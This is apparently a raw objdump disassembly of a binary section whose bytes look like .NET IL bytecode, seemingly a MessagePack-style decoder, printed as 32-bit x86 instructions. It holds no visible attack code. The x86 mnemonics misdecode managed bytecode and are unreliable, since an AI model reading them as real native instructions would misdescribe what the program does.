  4030d6:	04 a5                	add    $0xa5,%al
  4030d8:	61                   	popa
  4030d9:	00 00                	add    %al,(%eax)
  4030db:	01 2a                	add    %ebp,(%edx)
  4030dd:	02 7b 23             	add    0x23(%ebx),%bh
  4030e0:	00 00                	add    %al,(%eax)
  4030e2:	04 a5                	add    $0xa5,%al
  4030e4:	61                   	popa
  4030e5:	00 00                	add    %al,(%eax)
  4030e7:	01 28                	add    %ebp,(%eax)
  4030e9:	6a 00                	push   $0x0
  4030eb:	00 0a                	add    %cl,(%edx)
  4030ed:	2a 02                	sub    (%edx),%al
  4030ef:	7b 23                	jnp    0x403114
  4030f1:	00 00                	add    %al,(%eax)
  4030f3:	04 6f                	add    $0x6f,%al
  4030f5:	38 00                	cmp    %al,(%eax)
  4030f7:	00 0a                	add    %cl,(%edx)
  4030f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4030fa:	65 00 00             	add    %al,%gs:(%eax)
  4030fd:	0a 28                	or     (%eax),%ch
  4030ff:	6b 00 00             	imul   $0x0,(%eax),%eax
  403102:	0a 2a                	or     (%edx),%ch
  403104:	02 7b 23             	add    0x23(%ebx),%bh
  403107:	00 00                	add    %al,(%eax)
  403109:	04 a5                	add    $0xa5,%al
  40310b:	63 00                	arpl   %eax,(%eax)
  40310d:	00 01                	add    %al,(%ecx)
  40310f:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  403113:	0a 2a                	or     (%edx),%ch
  403115:	02 7b 23             	add    0x23(%ebx),%bh
  403118:	00 00                	add    %al,(%eax)
  40311a:	04 a5                	add    $0xa5,%al
  40311c:	64 00 00             	add    %al,%fs:(%eax)
  40311f:	01 28                	add    %ebp,(%eax)
  403121:	6d                   	insl   (%dx),%es:(%edi)
  403122:	00 00                	add    %al,(%eax)
  403124:	0a 2a                	or     (%edx),%ch
  403126:	02 7b 23             	add    0x23(%ebx),%bh
  403129:	00 00                	add    %al,(%eax)
  40312b:	04 a5                	add    $0xa5,%al
  40312d:	26 00 00             	add    %al,%es:(%eax)
  403130:	01 28                	add    %ebp,(%eax)
  403132:	6e                   	outsb  %ds:(%esi),(%dx)
  403133:	00 00                	add    %al,(%eax)
  403135:	0a 2a                	or     (%edx),%ch
  403137:	16                   	push   %ss
  403138:	6a 2a                	push   $0x2a
  40313a:	00 00                	add    %al,(%eax)
  40313c:	13 30                	adc    (%eax),%esi
  40313e:	02 00                	add    (%eax),%al
  403140:	84 00                	test   %al,(%eax)
  403142:	00 00                	add    %al,(%eax)
  403144:	0b 00                	or     (%eax),%eax
  403146:	00 11                	add    %dl,(%ecx)
  403148:	02 7b 24             	add    0x24(%ebx),%bh
  40314b:	00 00                	add    %al,(%eax)
  40314d:	04 0a                	add    $0xa,%al
  40314f:	06                   	push   %es
  403150:	1a 59 45             	sbb    0x45(%ecx),%bl
  403153:	07                   	pop    %es
  403154:	00 00                	add    %al,(%eax)
  403156:	00 13                	add    %dl,(%ebx)
  403158:	00 00                	add    %al,(%eax)
  40315a:	00 02                	add    %al,(%edx)
  40315c:	00 00                	add    %al,(%eax)
  40315e:	00 4f 00             	add    %cl,0x0(%edi)
  403161:	00 00                	add    %al,(%eax)
  403163:	4f                   	dec    %edi
  403164:	00 00                	add    %al,(%eax)
  403166:	00 24 00             	add    %ah,(%eax,%eax,1)
  403169:	00 00                	add    %al,(%eax)
  40316b:	30 00                	xor    %al,(%eax)
  40316d:	00 00                	add    %al,(%eax)
  40316f:	3d 00 00 00 2b       	cmp    $0x2b000000,%eax
  403174:	4d                   	dec    %ebp
  403175:	02 7b 23             	add    0x23(%ebx),%bh
  403178:	00 00                	add    %al,(%eax)
  40317a:	04 a5                	add    $0xa5,%al
  40317c:	61                   	popa
  40317d:	00 00                	add    %al,(%eax)
  40317f:	01 28                	add    %ebp,(%eax)
  403181:	6f                   	outsl  %ds:(%esi),(%dx)
  403182:	00 00                	add    %al,(%eax)
  403184:	0a 2a                	or     (%edx),%ch
  403186:	02 7b 23             	add    0x23(%ebx),%bh
  403189:	00 00                	add    %al,(%eax)
  40318b:	04 74                	add    $0x74,%al
  40318d:	4c                   	dec    %esp
  40318e:	00 00                	add    %al,(%eax)
  403190:	01 28                	add    %ebp,(%eax)
  403192:	70 00                	jo     0x403194
  403194:	00 0a                	add    %cl,(%edx)
  403196:	2a 02                	sub    (%edx),%al
  403198:	7b 23                	jnp    0x4031bd
  40319a:	00 00                	add    %al,(%eax)
  40319c:	04 a5                	add    $0xa5,%al
  40319e:	63 00                	arpl   %eax,(%eax)
  4031a0:	00 01                	add    %al,(%ecx)
  4031a2:	2a 02                	sub    (%edx),%al
  4031a4:	7b 23                	jnp    0x4031c9
  4031a6:	00 00                	add    %al,(%eax)
  4031a8:	04 a5                	add    $0xa5,%al
  4031aa:	64 00 00             	add    %al,%fs:(%eax)
  4031ad:	01 6c 2a 02          	add    %ebp,0x2(%edx,%ebp,1)
  4031b1:	7b 23                	jnp    0x4031d6
  4031b3:	00 00                	add    %al,(%eax)
  4031b5:	04 a5                	add    $0xa5,%al
  4031b7:	26 00 00             	add    %al,%es:(%eax)
  4031ba:	01 28                	add    %ebp,(%eax)
  4031bc:	6e                   	outsb  %ds:(%esi),(%dx)
  4031bd:	00 00                	add    %al,(%eax)
  4031bf:	0a 6c 2a 23          	or     0x23(%edx,%ebp,1),%ch
	...
  4031cb:	2a 42 02             	sub    0x2(%edx),%al
  4031ce:	03 7d 23             	add    0x23(%ebp),%edi
  4031d1:	00 00                	add    %al,(%eax)
  4031d3:	04 02                	add    $0x2,%al
  4031d5:	1f                   	pop    %ds
  4031d6:	0b 7d 24             	or     0x24(%ebp),%edi
  4031d9:	00 00                	add    %al,(%eax)
  4031db:	04 2a                	add    $0x2a,%al
  4031dd:	00 00                	add    %al,(%eax)
  4031df:	00 13                	add    %dl,(%ebx)
  4031e1:	30 02                	xor    %al,(%edx)
  4031e3:	00 a1 00 00 00 0c    	add    %ah,0xc000000(%ecx)
  4031e9:	00 00                	add    %al,(%eax)
  4031eb:	11 02                	adc    %eax,(%edx)
  4031ed:	7b 24                	jnp    0x403213
  4031ef:	00 00                	add    %al,(%eax)
  4031f1:	04 0a                	add    $0xa,%al
  4031f3:	06                   	push   %es
  4031f4:	1a 59 45             	sbb    0x45(%ecx),%bl
  4031f7:	08 00                	or     %al,(%eax)
  4031f9:	00 00                	add    %al,(%eax)
  4031fb:	13 00                	adc    (%eax),%eax
  4031fd:	00 00                	add    %al,(%eax)
  4031ff:	02 00                	add    (%eax),%al
  403201:	00 00                	add    %al,(%eax)
  403203:	6b 00 00             	imul   $0x0,(%eax),%eax
  403206:	00 6b 00             	add    %ch,0x0(%ebx)
  403209:	00 00                	add    %al,(%eax)
  40320b:	24 00                	and    $0x0,%al
  40320d:	00 00                	add    %al,(%eax)
  40320f:	35 00 00 00 46       	xor    $0x46000000,%eax
  403214:	00 00                	add    %al,(%eax)
  403216:	00 5f 00             	add    %bl,0x0(%edi)
  403219:	00 00                	add    %al,(%eax)
  40321b:	2b 69 02             	sub    0x2(%ecx),%ebp
  40321e:	7b 23                	jnp    0x403243
  403220:	00 00                	add    %al,(%eax)
  403222:	04 a5                	add    $0xa5,%al
  403224:	61                   	popa
  403225:	00 00                	add    %al,(%eax)
  403227:	01 28                	add    %ebp,(%eax)
  403229:	56                   	push   %esi
  40322a:	00 00                	add    %al,(%eax)
  40322c:	0a 2a                	or     (%edx),%ch
  40322e:	02 7b 23             	add    0x23(%ebx),%bh
  403231:	00 00                	add    %al,(%eax)
  403233:	04 6f                	add    $0x6f,%al
  403235:	38 00                	cmp    %al,(%eax)
  403237:	00 0a                	add    %cl,(%edx)
  403239:	28 22                	sub    %ah,(%edx)
  40323b:	00 00                	add    %al,(%eax)
  40323d:	06                   	push   %es
  40323e:	2a 02                	sub    (%edx),%al
  403240:	7b 23                	jnp    0x403265
  403242:	00 00                	add    %al,(%eax)
  403244:	04 a5                	add    $0xa5,%al
  403246:	63 00                	arpl   %eax,(%eax)
  403248:	00 01                	add    %al,(%ecx)
  40324a:	28 57 00             	sub    %dl,0x0(%edi)
  40324d:	00 0a                	add    %cl,(%edx)
  40324f:	2a 02                	sub    (%edx),%al
  403251:	7b 23                	jnp    0x403276
  403253:	00 00                	add    %al,(%eax)
  403255:	04 a5                	add    $0xa5,%al
  403257:	64 00 00             	add    %al,%fs:(%eax)
  40325a:	01 28                	add    %ebp,(%eax)
  40325c:	71 00                	jno    0x40325e
  40325e:	00 0a                	add    %cl,(%edx)
  403260:	2a 02                	sub    (%edx),%al
  403262:	7b 23                	jnp    0x403287
  403264:	00 00                	add    %al,(%eax)
  403266:	04 a5                	add    $0xa5,%al
  403268:	26 00 00             	add    %al,%es:(%eax)
  40326b:	01 0b                	add    %ecx,(%ebx)
  40326d:	12 01                	adc    (%ecx),%al
  40326f:	28 72 00             	sub    %dh,0x0(%edx)
  403272:	00 0a                	add    %cl,(%edx)
  403274:	28 56 00             	sub    %dl,0x0(%esi)
  403277:	00 0a                	add    %cl,(%edx)
  403279:	2a 02                	sub    (%edx),%al
  40327b:	7b 23                	jnp    0x4032a0
  40327d:	00 00                	add    %al,(%eax)
  40327f:	04 74                	add    $0x74,%al
  403281:	03 00                	add    (%eax),%eax
  403283:	00 1b                	add    %bl,(%ebx)
  403285:	2a 16                	sub    (%esi),%dl
  403287:	8d 57 00             	lea    0x0(%edi),%edx
  40328a:	00 01                	add    %al,(%ecx)
  40328c:	2a 52 02             	sub    0x2(%edx),%dl
  40328f:	28 3e                	sub    %bh,(%esi)
  403291:	00 00                	add    %al,(%eax)
  403293:	06                   	push   %es
  403294:	25 03 7d 21 00       	and    $0x217d03,%eax
  403299:	00 04 04             	add    %al,(%esp,%eax,1)
  40329c:	6f                   	outsl  %ds:(%esi),(%dx)
  40329d:	4f                   	dec    %edi
  40329e:	00 00                	add    %al,(%eax)
  4032a0:	06                   	push   %es
  4032a1:	2a 56 02             	sub    0x2(%esi),%dl
  4032a4:	28 3e                	sub    %bh,(%esi)
  4032a6:	00 00                	add    %al,(%eax)
  4032a8:	06                   	push   %es
  4032a9:	25 03 7d 21 00       	and    $0x217d03,%eax
  4032ae:	00 04 04             	add    %al,(%esp,%eax,1)
  4032b1:	6a 6f                	push   $0x6f
  4032b3:	42                   	inc    %edx
  4032b4:	00 00                	add    %al,(%eax)
  4032b6:	06                   	push   %es
  4032b7:	2a 13                	sub    (%ebx),%dl
  4032b9:	30 04 00             	xor    %al,(%eax,%eax,1)
  4032bc:	48                   	dec    %eax
  4032bd:	00 00                	add    %al,(%eax)
  4032bf:	00 0d 00 00 11 03    	add    %cl,0x3110000
  4032c5:	28 73 00             	sub    %dh,0x0(%ebx)
  4032c8:	00 0a                	add    %cl,(%edx)
  4032ca:	2c 3e                	sub    $0x3e,%al
  4032cc:	14 0a                	adc    $0xa,%al
  4032ce:	03 19                	add    (%ecx),%ebx
  4032d0:	17                   	pop    %ss
  4032d1:	17                   	pop    %ss
  4032d2:	73 74                	jae    0x403348
  4032d4:	00 00                	add    %al,(%eax)
  4032d6:	0a 0b                	or     (%ebx),%cl
  4032d8:	07                   	pop    %es
  4032d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4032da:	75 00                	jne    0x4032dc
  4032dc:	00 0a                	add    %cl,(%edx)
  4032de:	d4 8d                	aam    $0x8d
  4032e0:	57                   	push   %edi
  4032e1:	00 00                	add    %al,(%eax)
  4032e3:	01 0a                	add    %ecx,(%edx)
  4032e5:	07                   	pop    %es
  4032e6:	06                   	push   %es
  4032e7:	16                   	push   %ss
  4032e8:	07                   	pop    %es
  4032e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4032ea:	75 00                	jne    0x4032ec
  4032ec:	00 0a                	add    %cl,(%edx)
  4032ee:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  4032f5:	07                   	pop    %es
  4032f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4032f7:	76 00                	jbe    0x4032f9
  4032f9:	00 0a                	add    %cl,(%edx)
  4032fb:	07                   	pop    %es
  4032fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4032fd:	41                   	inc    %ecx
  4032fe:	00 00                	add    %al,(%eax)
  403300:	0a 02                	or     (%edx),%al
  403302:	06                   	push   %es
  403303:	28 47 00             	sub    %al,0x0(%edi)
  403306:	00 06                	add    %al,(%esi)
  403308:	17                   	pop    %ss
  403309:	2a 16                	sub    (%esi),%dl
  40330b:	2a f6                	sub    %dh,%dh
  40330d:	02 7b 23             	add    0x23(%ebx),%bh
  403310:	00 00                	add    %al,(%eax)
  403312:	04 2c                	add    $0x2c,%al
  403314:	33 03                	xor    (%ebx),%eax
  403316:	1c 73                	sbb    $0x73,%al
  403318:	77 00                	ja     0x40331a
  40331a:	00 0a                	add    %cl,(%edx)
  40331c:	25 02 7b 23 00       	and    $0x237b02,%eax
  403321:	00 04 74             	add    %al,(%esp,%esi,2)
  403324:	03 00                	add    (%eax),%eax
  403326:	00 1b                	add    %bl,(%ebx)
  403328:	16                   	push   %ss
  403329:	02 7b 23             	add    0x23(%ebx),%bh
  40332c:	00 00                	add    %al,(%eax)
  40332e:	04 74                	add    $0x74,%al
  403330:	03 00                	add    (%eax),%eax
  403332:	00 1b                	add    %bl,(%ebx)
  403334:	8e 69 6f             	mov    0x6f(%ecx),%gs
  403337:	4c                   	dec    %esp
  403338:	00 00                	add    %al,(%eax)
  40333a:	0a 25 6f 76 00 00    	or     0x766f,%ah
  403340:	0a 6f 41             	or     0x41(%edi),%ch
  403343:	00 00                	add    %al,(%eax)
  403345:	0a 17                	or     (%edi),%dl
  403347:	2a 16                	sub    (%esi),%dl
  403349:	2a 00                	sub    (%eax),%al
  40334b:	00 13                	add    %dl,(%ebx)
  40334d:	30 04 00             	xor    %al,(%eax,%eax,1)
  403350:	97                   	xchg   %eax,%edi
  403351:	00 00                	add    %al,(%eax)
  403353:	00 0e                	add    %cl,(%esi)
  403355:	00 00                	add    %al,(%eax)
  403357:	11 02                	adc    %eax,(%edx)
  403359:	0a 03                	or     (%ebx),%al
  40335b:	6f                   	outsl  %ds:(%esi),(%dx)
  40335c:	65 00 00             	add    %al,%gs:(%eax)
  40335f:	0a 19                	or     (%ecx),%bl
  403361:	8d 4d 00             	lea    0x0(%ebp),%ecx
  403364:	00 01                	add    %al,(%ecx)
  403366:	25 d0 40 00 00       	and    $0x40d0,%eax
  40336b:	04 28                	add    $0x28,%al
  40336d:	78 00                	js     0x40336f
  40336f:	00 0a                	add    %cl,(%edx)
  403371:	6f                   	outsl  %ds:(%esi),(%dx)
  403372:	28 00                	sub    %al,(%eax)
  403374:	00 0a                	add    %cl,(%edx)
  403376:	0c 14                	or     $0x14,%al
  403378:	0d 08 8e 2d 02       	or     $0x22d8e08,%eax
  40337d:	14 2a                	adc    $0x2a,%al
  40337f:	08 8e 69 17 31 36    	or     %cl,0x36311769(%esi)
  403385:	16                   	push   %ss
  403386:	13 05 2b 28 08 11    	adc    0x1108282b,%eax
  40338c:	05 9a 0d 06 09       	add    $0x9060d9a,%eax
  403391:	6f                   	outsl  %ds:(%esi),(%dx)
  403392:	3c 00                	cmp    $0x0,%al
  403394:	00 06                	add    %al,(%esi)
  403396:	0b 07                	or     (%edi),%eax
  403398:	2d 10 06 6f 3d       	sub    $0x3d6f0610,%eax
  40339d:	00 00                	add    %al,(%eax)
  40339f:	06                   	push   %es
  4033a0:	0a 06                	or     (%esi),%al
  4033a2:	09 6f 38             	or     %ebp,0x38(%edi)
  4033a5:	00 00                	add    %al,(%eax)
  4033a7:	06                   	push   %es
  4033a8:	2b 02                	sub    (%edx),%eax
  4033aa:	07                   	pop    %es
  4033ab:	0a 11                	or     (%ecx),%dl
  4033ad:	05 17 58 13 05       	add    $0x5135817,%eax
  4033b2:	11 05 08 8e 69 17    	adc    %eax,0x17698e08
  4033b8:	59                   	pop    %ecx
  4033b9:	32 cf                	xor    %bh,%cl
  4033bb:	08 08                	or     %cl,(%eax)
  4033bd:	8e 69 17             	mov    0x17(%ecx),%gs
  4033c0:	59                   	pop    %ecx
  4033c1:	9a 0d 06 09 6f 3b 00 	lcall  $0x3b,$0x6f09060d
  4033c8:	00 06                	add    %al,(%esi)
  4033ca:	13 04 11             	adc    (%ecx,%edx,1),%eax
  4033cd:	04 15                	add    $0x15,%al
  4033cf:	31 0e                	xor    %ecx,(%esi)
  4033d1:	06                   	push   %es
  4033d2:	7b 26                	jnp    0x4033fa
  4033d4:	00 00                	add    %al,(%eax)
  4033d6:	04 11                	add    $0x11,%al
  4033d8:	04 6f                	add    $0x6f,%al
  4033da:	59                   	pop    %ecx
  4033db:	00 00                	add    %al,(%eax)
  4033dd:	0a 2a                	or     (%edx),%ch
  4033df:	06                   	push   %es
  4033e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4033e1:	3d 00 00 06 0a       	cmp    $0xa060000,%eax
  4033e6:	06                   	push   %es
  4033e7:	09 6f 38             	or     %ebp,0x38(%edi)
  4033ea:	00 00                	add    %al,(%eax)
  4033ec:	06                   	push   %es
  4033ed:	06                   	push   %es
  4033ee:	2a 56 02             	sub    0x2(%esi),%dl
  4033f1:	28 39                	sub    %bh,(%ecx)
  4033f3:	00 00                	add    %al,(%eax)
  4033f5:	06                   	push   %es
  4033f6:	02 14 7d 23 00 00 04 	add    0x4000023(,%edi,2),%dl
  4033fd:	02 17                	add    (%edi),%dl
  4033ff:	7d 24                	jge    0x403425
  403401:	00 00                	add    %al,(%eax)
  403403:	04 2a                	add    $0x2a,%al
  403405:	3e 02 03             	add    %ds:(%ebx),%al
  403408:	7d 23                	jge    0x40342d
  40340a:	00 00                	add    %al,(%eax)
  40340c:	04 02                	add    $0x2,%al
  40340e:	1a 7d 24             	sbb    0x24(%ebp),%bh
  403411:	00 00                	add    %al,(%eax)
  403413:	04 2a                	add    $0x2a,%al
  403415:	6a 02                	push   $0x2
  403417:	7b 23                	jnp    0x40343c
  403419:	00 00                	add    %al,(%eax)
  40341b:	04 2d                	add    $0x2d,%al
  40341d:	06                   	push   %es
  40341e:	72 01                	jb     0x403421
  403420:	01 00                	add    %eax,(%eax)
  403422:	70 2a                	jo     0x40344e
  403424:	02 7b 23             	add    0x23(%ebx),%bh
  403427:	00 00                	add    %al,(%eax)
  403429:	04 6f                	add    $0x6f,%al
  40342b:	38 00                	cmp    %al,(%eax)
  40342d:	00 0a                	add    %cl,(%edx)
  40342f:	2a 52 02             	sub    0x2(%edx),%dl
  403432:	1d 7d 24 00 00       	sbb    $0x247d,%eax
  403437:	04 02                	add    $0x2,%al
  403439:	03 8c 6c 00 00 01 7d 	add    0x7d010000(%esp,%ebp,2),%ecx
  403440:	23 00                	and    (%eax),%eax
  403442:	00 04 2a             	add    %al,(%edx,%ebp,1)
  403445:	56                   	push   %esi
  403446:	02 1f                	add    (%edi),%bl
  403448:	09 7d 24             	or     %edi,0x24(%ebp)
  40344b:	00 00                	add    %al,(%eax)
  40344d:	04 02                	add    $0x2,%al
  40344f:	03 8c 64 00 00 01 7d 	add    0x7d010000(%esp,%eiz,2),%ecx
  403456:	23 00                	and    (%eax),%eax
  403458:	00 04 2a             	add    %al,(%edx,%ebp,1)
  40345b:	52                   	push   %edx
  40345c:	02 1e                	add    (%esi),%bl
  40345e:	7d 24                	jge    0x403484
  403460:	00 00                	add    %al,(%eax)
  403462:	04 02                	add    $0x2,%al
  403464:	03 8c 63 00 00 01 7d 	add    0x7d010000(%ebx,%eiz,2),%ecx
  40346b:	23 00                	and    (%eax),%eax
  40346d:	00 04 2a             	add    %al,(%edx,%ebp,1)
  403470:	1b 30                	sbb    (%eax),%esi
  403472:	04 00                	add    $0x0,%al
  403474:	35 00 00 00 0f       	xor    $0xf000000,%eax
  403479:	00 00                	add    %al,(%eax)
  40347b:	11 73 79             	adc    %esi,0x79(%ebx)
  40347e:	00 00                	add    %al,(%eax)
  403480:	0a 0a                	or     (%edx),%cl
  403482:	03 28                	add    (%eax),%ebp
  403484:	a0 00 00 06 10       	mov    0x10060000,%al
  403489:	01 06                	add    %eax,(%esi)
  40348b:	03 16                	add    (%esi),%edx
  40348d:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  403493:	00 0a                	add    %cl,(%edx)
  403495:	06                   	push   %es
  403496:	16                   	push   %ss
  403497:	6a 6f                	push   $0x6f
  403499:	4e                   	dec    %esi
  40349a:	00 00                	add    %al,(%eax)
  40349c:	0a 02                	or     (%edx),%al
  40349e:	06                   	push   %es
  40349f:	28 56 00             	sub    %dl,0x0(%esi)
  4034a2:	00 06                	add    %al,(%esi)
  4034a4:	de 0a                	fimuls (%edx)
  4034a6:	06                   	push   %es
  4034a7:	2c 06                	sub    $0x6,%al
  4034a9:	06                   	push   %es
  4034aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4034ab:	33 00                	xor    (%eax),%eax
  4034ad:	00 0a                	add    %cl,(%edx)
  4034af:	dc 2a                	fsubrl (%edx)
  4034b1:	00 00                	add    %al,(%eax)
  4034b3:	00 01                	add    %al,(%ecx)
  4034b5:	10 00                	adc    %al,(%eax)
  4034b7:	00 02                	add    %al,(%edx)
  4034b9:	00 06                	add    %al,(%esi)
  4034bb:	00 24 2a             	add    %ah,(%edx,%ebp,1)
  4034be:	00 0a                	add    %cl,(%edx)
  4034c0:	00 00                	add    %al,(%eax)
  4034c2:	00 00                	add    %al,(%eax)
  4034c4:	13 30                	adc    (%eax),%esi
  4034c6:	02 00                	add    (%eax),%al
  4034c8:	16                   	push   %ss
  4034c9:	00 00                	add    %al,(%eax)
  4034cb:	00 10                	add    %dl,(%eax)
  4034cd:	00 00                	add    %al,(%eax)
  4034cf:	11 03                	adc    %eax,(%ebx)
  4034d1:	19 73 77             	sbb    %esi,0x77(%ebx)
  4034d4:	00 00                	add    %al,(%eax)
  4034d6:	0a 0a                	or     (%edx),%cl
  4034d8:	02 06                	add    (%esi),%al
  4034da:	28 56 00             	sub    %dl,0x0(%esi)
  4034dd:	00 06                	add    %al,(%esi)
  4034df:	06                   	push   %es
  4034e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4034e1:	41                   	inc    %ecx
  4034e2:	00 00                	add    %al,(%eax)
  4034e4:	0a 2a                	or     (%edx),%ch
  4034e6:	00 00                	add    %al,(%eax)
  4034e8:	13 30                	adc    (%eax),%esi
  4034ea:	04 00                	add    $0x0,%al
  4034ec:	83 05 00 00 0a 00 00 	addl   $0x0,0xa0000
  4034f3:	11 03                	adc    %eax,(%ebx)
  4034f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4034f6:	7a 00                	jp     0x4034f8
  4034f8:	00 0a                	add    %cl,(%edx)
  4034fa:	d2 0a                	rorb   %cl,(%edx)
  4034fc:	14 0b                	adc    $0xb,%al
  4034fe:	16                   	push   %ss
  4034ff:	0c 16                	or     $0x16,%al
  403501:	0d 06 1f 7f 30       	or     $0x307f1f06,%eax
  403506:	09 02                	or     %eax,(%edx)
  403508:	06                   	push   %es
  403509:	6e                   	outsb  %ds:(%esi),(%dx)
  40350a:	28 42 00             	sub    %al,0x0(%edx)
  40350d:	00 06                	add    %al,(%esi)
  40350f:	2a 06                	sub    (%esi),%al
  403511:	20 80 00 00 00 32    	and    %al,0x32000000(%eax)
  403517:	42                   	inc    %edx
  403518:	06                   	push   %es
  403519:	20 8f 00 00 00 30    	and    %cl,0x30000000(%edi)
  40351f:	3a 02                	cmp    (%edx),%al
  403521:	28 39                	sub    %bh,(%ecx)
  403523:	00 00                	add    %al,(%eax)
  403525:	06                   	push   %es
  403526:	02 18                	add    (%eax),%bl
  403528:	7d 24                	jge    0x40354e
  40352a:	00 00                	add    %al,(%eax)
  40352c:	04 06                	add    $0x6,%al
  40352e:	20 80 00 00 00 59    	and    %al,0x59000000(%eax)
  403534:	0c 16                	or     $0x16,%al
  403536:	0d 2b 1c 02 28       	or     $0x28021c2b,%eax
  40353b:	3a 00                	cmp    (%eax),%al
  40353d:	00 06                	add    %al,(%esi)
  40353f:	25 03 28 64 00       	and    $0x642803,%eax
  403544:	00 06                	add    %al,(%esi)
  403546:	6f                   	outsl  %ds:(%esi),(%dx)
  403547:	38 00                	cmp    %al,(%eax)
  403549:	00 06                	add    %al,(%esi)
  40354b:	03 6f 56             	add    0x56(%edi),%ebp
  40354e:	00 00                	add    %al,(%eax)
  403550:	06                   	push   %es
  403551:	09 17                	or     %edx,(%edi)
  403553:	58                   	pop    %eax
  403554:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  403559:	2a 06                	sub    (%esi),%al
  40355b:	20 90 00 00 00 32    	and    %dl,0x32000000(%eax)
  403561:	36 06                	ss push %es
  403563:	20 9f 00 00 00 30    	and    %bl,0x30000000(%edi)
  403569:	2e 02 28             	add    %cs:(%eax),%ch
  40356c:	39 00                	cmp    %eax,(%eax)
  40356e:	00 06                	add    %al,(%esi)
  403570:	02 19                	add    (%ecx),%bl
  403572:	7d 24                	jge    0x403598
  403574:	00 00                	add    %al,(%eax)
  403576:	04 06                	add    $0x6,%al
  403578:	20 90 00 00 00 59    	and    %dl,0x59000000(%eax)
  40357e:	0c 16                	or     $0x16,%al
  403580:	0d 2b 10 02 28       	or     $0x2802102b,%eax
  403585:	3a 00                	cmp    (%eax),%al
  403587:	00 06                	add    %al,(%esi)
  403589:	03 6f 56             	add    0x56(%edi),%ebp
  40358c:	00 00                	add    %al,(%eax)
  40358e:	06                   	push   %es
  40358f:	09 17                	or     %edx,(%edi)
  403591:	58                   	pop    %eax
  403592:	0d 09 08 32 ec       	or     $0xec320809,%eax
  403597:	2a 06                	sub    (%esi),%al
  403599:	20 a0 00 00 00 32    	and    %ah,0x32000000(%eax)
  40359f:	1e                   	push   %ds
  4035a0:	06                   	push   %es
  4035a1:	20 bf 00 00 00 30    	and    %bh,0x30000000(%edi)
  4035a7:	16                   	push   %ss
  4035a8:	06                   	push   %es
  4035a9:	20 a0 00 00 00 59    	and    %ah,0x59000000(%eax)
  4035af:	0c 02                	or     $0x2,%al
  4035b1:	03 08                	add    (%eax),%ecx
  4035b3:	28 63 00             	sub    %ah,0x0(%ebx)
  4035b6:	00 06                	add    %al,(%esi)
  4035b8:	28 4f 00             	sub    %cl,0x0(%edi)
  4035bb:	00 06                	add    %al,(%esi)
  4035bd:	2a 06                	sub    (%esi),%al
  4035bf:	20 e0                	and    %ah,%al
  4035c1:	00 00                	add    %al,(%eax)
  4035c3:	00 32                	add    %dh,(%edx)
  4035c5:	12 06                	adc    (%esi),%al
  4035c7:	20 ff                	and    %bh,%bh
  4035c9:	00 00                	add    %al,(%eax)
  4035cb:	00 30                	add    %dh,(%eax)
  4035cd:	0a 02                	or     (%edx),%al
  4035cf:	06                   	push   %es
  4035d0:	67 6a 28             	addr16 push $0x28
  4035d3:	42                   	inc    %edx
  4035d4:	00 00                	add    %al,(%eax)
  4035d6:	06                   	push   %es
  4035d7:	2a 06                	sub    (%esi),%al
  4035d9:	20 c0                	and    %al,%al
  4035db:	00 00                	add    %al,(%eax)
  4035dd:	00 33                	add    %dh,(%ebx)
  4035df:	07                   	pop    %es
  4035e0:	02 28                	add    (%eax),%ch
  4035e2:	4e                   	dec    %esi
  4035e3:	00 00                	add    %al,(%eax)
  4035e5:	06                   	push   %es
  4035e6:	2a 06                	sub    (%esi),%al
  4035e8:	20 c1                	and    %al,%cl
  4035ea:	00 00                	add    %al,(%eax)
  4035ec:	00 33                	add    %dh,(%ebx)
  4035ee:	0b 72 7b             	or     0x7b(%edx),%esi
  4035f1:	01 00                	add    %eax,(%eax)
  4035f3:	70 73                	jo     0x403668
  4035f5:	7b 00                	jnp    0x4035f7
  4035f7:	00 0a                	add    %cl,(%edx)
  4035f9:	7a 06                	jp     0x403601
  4035fb:	20 c2                	and    %al,%dl
  4035fd:	00 00                	add    %al,(%eax)
  4035ff:	00 33                	add    %dh,(%ebx)
  403601:	08 02                	or     %al,(%edx)
  403603:	16                   	push   %ss
  403604:	28 51 00             	sub    %dl,0x0(%ecx)
  403607:	00 06                	add    %al,(%esi)
  403609:	2a 06                	sub    (%esi),%al
  40360b:	20 c3                	and    %al,%bl
  40360d:	00 00                	add    %al,(%eax)
  40360f:	00 33                	add    %dh,(%ebx)
  403611:	08 02                	or     %al,(%edx)
  403613:	17                   	pop    %ss
  403614:	28 51 00             	sub    %dl,0x0(%ecx)
  403617:	00 06                	add    %al,(%esi)
  403619:	2a 06                	sub    (%esi),%al
  40361b:	20 c4                	and    %al,%ah
  40361d:	00 00                	add    %al,(%eax)
  40361f:	00 33                	add    %dh,(%ebx)
  403621:	20 03                	and    %al,(%ebx)
  403623:	6f                   	outsl  %ds:(%esi),(%dx)
  403624:	7a 00                	jp     0x403626
  403626:	00 0a                	add    %cl,(%edx)
  403628:	0c 08                	or     $0x8,%al
  40362a:	8d 57 00             	lea    0x0(%edi),%edx
  40362d:	00 01                	add    %al,(%ecx)
  40362f:	0b 03                	or     (%ebx),%eax
  403631:	07                   	pop    %es
  403632:	16                   	push   %ss
  403633:	08 6f 45             	or     %ch,0x45(%edi)
  403636:	00 00                	add    %al,(%eax)
  403638:	0a 26                	or     (%esi),%ah
  40363a:	02 07                	add    (%edi),%al
  40363c:	28 47 00             	sub    %al,0x0(%edi)
  40363f:	00 06                	add    %al,(%esi)
  403641:	2a 06                	sub    (%esi),%al
  403643:	20 c5                	and    %al,%ch
  403645:	00 00                	add    %al,(%eax)
  403647:	00 33                	add    %dh,(%ebx)
  403649:	39 18                	cmp    %ebx,(%eax)
  40364b:	8d 57 00             	lea    0x0(%edi),%edx
  40364e:	00 01                	add    %al,(%ecx)
  403650:	0b 03                	or     (%ebx),%eax
  403652:	07                   	pop    %es
  403653:	16                   	push   %ss
